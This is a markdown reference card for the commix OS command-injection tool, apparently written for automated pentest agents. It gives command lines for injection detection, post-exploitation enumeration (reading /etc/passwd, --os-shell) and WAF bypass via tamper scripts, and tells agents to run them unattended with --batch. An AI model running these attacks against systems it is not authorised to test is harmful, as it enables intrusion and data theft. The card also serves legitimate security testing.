---
tool_name: commix
category: exploitation
tags: [command-injection, os-command, rce, blind-injection]
used_by_agents: [command_injection_agent, planner_agent]
---

# commix — Command Injection Exploiter

## What It Does
Automates detection and exploitation of OS command injection vulnerabilities. Supports results-based, eval-based, and time-based blind techniques. Think "sqlmap but for command injection."

## CRITICAL: Always use `--batch` for non-interactive automated execution.

---

## Basic Detection

### GET parameter
```bash
commix -u "http://target.com/page.php?ip=127.0.0.1" --batch
```

### POST parameter
```bash
commix -u "http://target.com/page.php" --data="ip=127.0.0.1&Submit=Submit" --batch
```

### Specify injectable parameter
```bash
commix -u "http://target.com/page.php?ip=127.0.0.1&action=ping" -p ip --batch
```

### With cookies/session
```bash
commix -u "http://target.com/page.php?ip=127.0.0.1" --cookie="PHPSESSID=abc123;security=low" --batch
```

### Custom headers
```bash
commix -u "http://target.com/page.php?ip=127.0.0.1" --headers="Authorization: Bearer TOKEN" --batch
```

---

## Injection Techniques

```bash
# Classic/Results-based (C), Eval-based (E), Time-based blind (T)
commix -u "http://target.com/page.php?ip=127.0.0.1" --technique=C --batch
commix -u "http://target.com/page.php?ip=127.0.0.1" --technique=T --batch
commix -u "http://target.com/page.php?ip=127.0.0.1" --technique=CET --batch

# Increase test level (1-3, default 1)
commix -u "http://target.com/page.php?ip=127.0.0.1" --level=3 --batch
```

---

## Enumeration (Post-Exploitation)

```bash
# Current OS user
commix -u "http://target.com/page.php?ip=127.0.0.1" --current-user --batch

# Hostname
commix -u "http://target.com/page.php?ip=127.0.0.1" --hostname --batch

# System info
commix -u "http://target.com/page.php?ip=127.0.0.1" --sys-info --batch

# All users
commix -u "http://target.com/page.php?ip=127.0.0.1" --users --batch

# User privileges
commix -u "http://target.com/page.php?ip=127.0.0.1" --privileges --batch

# Execute specific command
commix -u "http://target.com/page.php?ip=127.0.0.1" --os-cmd="cat /etc/passwd" --batch
```

---

## WAF/Filter Bypass

```bash
# Base64 encode injections
commix -u "http://target.com/page.php?ip=127.0.0.1" --tamper="base64encode" --batch

# Replace spaces with $IFS (bypasses space filters)
commix -u "http://target.com/page.php?ip=127.0.0.1" --tamper="space2ifs" --batch

# Multiple tamper scripts
commix -u "http://target.com/page.php?ip=127.0.0.1" --tamper="base64encode,space2ifs" --batch
```

---

## Proxy

```bash
commix -u "http://target.com/page.php?ip=127.0.0.1" --proxy="http://127.0.0.1:8080" --batch
```

---

## Output Interpretation

### Injection found:
```
[*] Testing the classic injection technique...
[+] The GET parameter 'ip' seems injectable via (results-based) classic injection technique.
    |_ Payload: ;echo SDXKHJ$((44+33))$(echo SDXKHJ)SDXKHJ

[+] The target URL is vulnerable to OS command injection.
    |_ The following technique(s) found: classic injection technique (results-based)
```
**Success indicators**: `[+]` prefixed lines, "seems injectable", "is vulnerable to OS command injection"

### Enumeration output:
```
[+] Current user: www-data
[+] Hostname: dvwa-container
```

### No injection found:
```
[*] Testing the classic injection technique...
[-] The GET parameter 'ip' does not seem to be injectable.
[*] Testing the time-based injection technique...
[-] The GET parameter 'ip' does not seem to be injectable.
[x] All tested parameters do not appear to be injectable.
```
**Failure indicators**: `[-]` prefixed lines, "does not seem to be injectable", "All tested parameters do not appear to be injectable"

---

## Common Flags Reference

| Flag | Purpose |
|------|---------|
| `-u`, `--url` | Target URL |
| `--data` | POST data string |
| `-p` | Specific parameter to test |
| `--cookie` | Cookie header value |
| `--headers` | Extra headers |
| `--batch` | **Non-interactive mode (ALWAYS USE)** |
| `--os-cmd` | Execute a single OS command |
| `--os-shell` | Interactive OS shell |
| `--current-user` | Retrieve current OS user |
| `--hostname` | Retrieve hostname |
| `--sys-info` | Retrieve system info |
| `--technique` | Injection technique: C (classic), E (eval), T (time-based) |
| `--level` | Test level 1-3 (higher = more payloads) |
| `--tamper` | Tamper script(s) for evasion |
| `--proxy` | Proxy URL |
